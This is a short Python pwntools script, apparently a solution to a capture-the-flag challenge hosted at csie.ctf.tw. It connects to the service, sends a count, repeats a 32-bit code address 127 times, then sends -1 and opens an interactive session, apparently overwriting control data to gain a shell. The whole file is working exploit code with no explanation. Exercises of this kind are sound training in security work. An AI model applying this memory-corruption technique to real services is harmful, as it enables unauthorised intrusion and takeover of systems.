#!/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10121)
r.sendline('127')
for _ in range(127): r.sendline('134514048')

r.sendline('-1')
r.interactive()
